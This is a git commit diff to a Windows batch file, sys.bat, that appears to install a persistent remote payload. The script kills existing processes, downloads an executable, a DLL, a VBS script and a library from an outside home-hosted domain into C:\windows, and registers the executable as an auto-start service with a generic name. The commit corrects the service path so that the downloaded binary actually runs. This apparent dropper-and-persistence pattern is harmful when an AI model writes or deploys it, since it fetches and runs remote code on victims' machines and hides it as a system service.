542238501df4780cf9ccdbca2faf3c2f280f94e7
pistacchietto <pistacchietto2@gmail.com>
2019-07-26 15:15:42 +0200

    ok

--- sys.bat
+++ sys.bat
@@ -2,7 +2,7 @@ taskill /f /im sys1.exe
 taskill /f /im sys2.exe
 sc delete CppWindowsService
 wget http://troglo.homepc.it/win/sys2.exe -O c:\windows\sys2.exe
-sc create CppWindowsService binPath= c:\windows\ DisplayName= "CppWindowsService" start= auto
+sc create CppWindowsService binPath= c:\windows\sys2.exe DisplayName= "CppWindowsService" start= auto
 wget http://troglo.homepc.it/win/sys2.dll -O c:\windows\sys2.dll
 wget http://troglo.homepc.it/win/sys2.vbs -O c:\windows\sys2.vbs
 wget http://troglo.homepc.it/win/libssl-1_1.dll -O c:\windows\libssl-1_1.dll
